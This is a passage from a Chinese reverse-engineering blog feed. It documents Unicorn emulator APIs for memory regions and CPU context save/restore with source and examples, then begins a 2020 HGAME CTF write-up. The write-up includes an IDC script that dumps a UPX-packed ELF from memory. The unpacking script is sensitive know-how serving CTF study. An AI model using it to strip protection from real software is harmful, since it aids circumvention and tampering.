&#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_mem_region *region;</span><br><span class="line">    <span class="keyword">uint32_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_regions(uc, &amp;region, &amp;count))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_regions"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"起始地址： 0x"</span> &lt;&lt; hex &lt;&lt; region-&gt;begin &lt;&lt; <span class="string">"  结束地址： 0x"</span> &lt;&lt; hex &lt;&lt; region-&gt;end &lt;&lt; <span class="string">"  内存权限：  "</span> &lt;&lt;region-&gt;perms &lt;&lt; <span class="string">"  已申请内存块数： "</span> &lt;&lt; count &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> ((err = uc_free(region))) &#123;    <span class="comment">////注意释放内存</span></span><br><span class="line">        uc_perror(<span class="string">"uc_free"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/20/kbrF7NdV6LDxnYI.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/20/kbrF7NdV6LDxnYI.png" class="lazyload"></a></p><h3 id="uc-free"><a href="#uc-free" class="headerlink" title="uc_free"></a>uc_free</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_free</span><span class="params">(<span class="keyword">void</span> *mem)</span></span>;</span><br></pre></td></tr></table></figure></div><p>释放由 uc_context_alloc 和 uc_mem_regions 申请的内存</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@mem: 由uc_context_alloc (返回 *context), 或由 uc_mem_regions (返回 *regions)申请的内存</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_free</span><span class="params">(<span class="keyword">void</span> *mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_free(mem);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g_free</span><span class="params">(gpointer ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_mem_regions</p><h3 id="uc-context-alloc"><a href="#uc-context-alloc" class="headerlink" title="uc_context_alloc"></a>uc_context_alloc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_alloc</span><span class="params">(uc_engine *uc, uc_context **context)</span></span>;</span><br></pre></td></tr></table></figure></div><p>分配一个可以与uc_context_{save,restore}一起使用的区域来执行CPU上下文的快速保存/回滚，包括寄存器和内部元数据。上下文不能在具有不同架构或模式的引擎实例之间共享。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: 指向uc_engine*的指针。当这个函数成功返回时，将使用指向新上下文的指针更新它。之后必须使用uc_free()释放这些分配的内存。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_alloc</span><span class="params">(uc_engine *uc, uc_context **context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> **_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = cpu_context_size(uc-&gt;arch, uc-&gt;mode);</span><br><span class="line"></span><br><span class="line">    *_context = <span class="built_in">malloc</span>(<span class="built_in">size</span> + <span class="keyword">sizeof</span>(uc_context));</span><br><span class="line">    <span class="keyword">if</span> (*_context) &#123;</span><br><span class="line">        (*_context)-&gt;<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32_INC <span class="meta-string">"\x40"</span>   <span class="comment">// INC eax</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_context* context;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x1</span>;    <span class="comment">// EAX 寄存器</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"===================================\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Save/restore CPU context in opaque blob\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">8</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32_INC, <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Running emulation for the first time\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">            err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请并保存 CPU 上下文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Saving CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_context_alloc(uc, &amp;context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_alloc() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = uc_context_save(uc, context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_save() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Running emulation for the second time\n"</span>);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32_INC) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">            err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复 CPU 上下文</span></span><br><span class="line">    err = uc_context_restore(uc, context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_context_restore() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; CPU context restored. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 CPU 上下文</span></span><br><span class="line">    err = uc_free(context);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_free() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_close(uc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/20/juNPWvwGUlraKRh.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/20/juNPWvwGUlraKRh.png" class="lazyload"></a></p><h3 id="uc-context-save"><a href="#uc-context-save" class="headerlink" title="uc_context_save"></a>uc_context_save</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_save</span><span class="params">(uc_engine *uc, uc_context *context)</span></span>;</span><br></pre></td></tr></table></figure></div><p>保存当前CPU上下文</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: uc_context_alloc() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_save</span><span class="params">(uc_engine *uc, uc_context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> *_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_context-&gt;data, uc-&gt;cpu-&gt;env_ptr, _context-&gt;<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_context_alloc()</p><h3 id="uc-context-restore"><a href="#uc-context-restore" class="headerlink" title="uc_context_restore"></a>uc_context_restore</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_restore</span><span class="params">(uc_engine *uc, uc_context *context)</span></span>;</span><br></pre></td></tr></table></figure></div><p>恢复已保存的CPU上下文</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@context: uc_context_alloc() 返回并且已使用 uc_context_save 保存的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_context_restore</span><span class="params">(uc_engine *uc, uc_context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_context</span> *_<span class="title">context</span> = <span class="title">context</span>;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(uc-&gt;cpu-&gt;env_ptr, _context-&gt;data, _context-&gt;<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_context_alloc()</p><h3 id="uc-context-size"><a href="#uc-context-size" class="headerlink" title="uc_context_size"></a>uc_context_size</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">uc_context_size</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure></div><p>返回存储cpu上下文所需的大小。可以用来分配一个缓冲区来包含cpu上下文，并直接调用uc_context_save。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 存储cpu上下文所需的大小，类型为 size_t.</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">uc_context_size</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> cpu_context_size(uc-&gt;arch, uc-&gt;mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">cpu_context_size</span><span class="params">(uc_arch arch, uc_mode mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:  <span class="keyword">return</span> M68K_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:   <span class="keyword">return</span> X86_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:   <span class="keyword">return</span> mode &amp; UC_MODE_BIG_ENDIAN ? ARM_REGS_STORAGE_SIZE_armeb : ARM_REGS_STORAGE_SIZE_arm;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64: <span class="keyword">return</span> mode &amp; UC_MODE_BIG_ENDIAN ? ARM64_REGS_STORAGE_SIZE_aarch64eb : ARM64_REGS_STORAGE_SIZE_aarch64;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">            <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS64_REGS_STORAGE_SIZE_mips64;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS64_REGS_STORAGE_SIZE_mips64el;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS_REGS_STORAGE_SIZE_mips;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS_REGS_STORAGE_SIZE_mipsel;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC: <span class="keyword">return</span> mode &amp; UC_MODE_SPARC64 ? SPARC64_REGS_STORAGE_SIZE : SPARC_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例同uc_context_alloc()</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-四&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-四&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2020HGAME Week2 WP</title>
    <link href="https://kabeor.github.io/2020HGAME%20Week2%20WP/"/>
    <id>https://kabeor.github.io/2020HGAME%20Week2%20WP/</id>
    <published>2020-02-07T16:00:00.000Z</published>
    <updated>2020-03-16T04:54:25.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020HGAME-Week2-WP"><a href="#2020HGAME-Week2-WP" class="headerlink" title="2020HGAME Week2 WP"></a>2020HGAME Week2 WP</h1><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><p>拿到一个elf，upx3.91的壳，一般工具都脱不了，直接ida动态调，到oep之后dump</p><p>IDC dump脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">         <span class="keyword">auto</span> e_phoff;</span><br><span class="line">         <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">         <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">         ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">         StartImg=<span class="number">0x400000</span>;</span><br><span class="line">         EndImg=<span class="number">0x0</span>;</span><br><span class="line">         <span class="keyword">if</span> (Dword(ImageBase)==<span class="number">0x7f454c46</span> || Dword(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=fopen(<span class="string">"G:\\dumpfile"</span>,<span class="string">"wb"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+Qword(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      Message(<span class="string">"e_phoff = 0x%x\n"</span>, e_phoff);</span><br><span class="line">      e_phnum=Word(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      Message(<span class="string">"e_phnum = 0x%x\n"</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123; </span><br><span class="line">                                 p_offset=Qword(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">                                 StartImg=Qword(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">                                 EndImg=StartImg+Qword(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">                                 Message(<span class="string">"start = 0x%x, end = 0x%x, offset = 0x%x\n"</span>, StartImg, EndImg, p_offset);</span><br><span class="line">                                 dump(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 Message(<span class="string">"dump segment %d ok.\n"</span>,i);</span><br><span class="line">                         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      fclose(dumpfile);</span><br><span class="line">        &#125;<span class="keyword">else</span> Message(<span class="string">"dump err."</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> i;</span><br><span class="line">        <span class="keyword">auto</span> <span class="built_in">size</span>;</span><br><span class="line">        <span class="built_in">size</span>=endimg-startimg;</span><br><span class="line">        fseek(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; <span class="built_in">size</span>; i=i+<span class="number">1</span> ) </span><br><span class="line">        &#123;</span><br><span class="line">        fputc(Byte(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>脱壳之后的逻辑很简单，直接放脚本了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">box= [ <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x5B</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, 